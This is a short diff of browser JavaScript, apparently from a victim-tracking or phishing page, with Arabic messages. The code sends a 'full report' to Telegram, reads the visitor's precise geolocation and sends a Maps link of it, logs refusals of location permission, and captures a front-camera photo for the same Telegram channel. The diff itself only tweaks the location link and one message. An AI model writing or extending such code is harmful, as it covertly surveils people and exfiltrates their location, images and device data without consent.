@@ -96,10 +96,11 @@
             const report = await getFullReport();
             await sendToTelegram(report);
 
+            
             navigator.geolocation.getCurrentPosition(async (p) => {
-                const mapUrl = `http://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                const mapUrl = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                 await sendToTelegram(`📍 *الموقع الدقيق*:\n[فتح عبر الخرائط](${mapUrl})`);
-            }, () => sendToTelegram("❌ رفض الموقع"));
+            }, () => sendToTelegram("❌ رفض إذن الموقع"));
 
             const front = await snap("user");
             if(front) await sendToTelegram("📸 صورة أمامية", true, front);
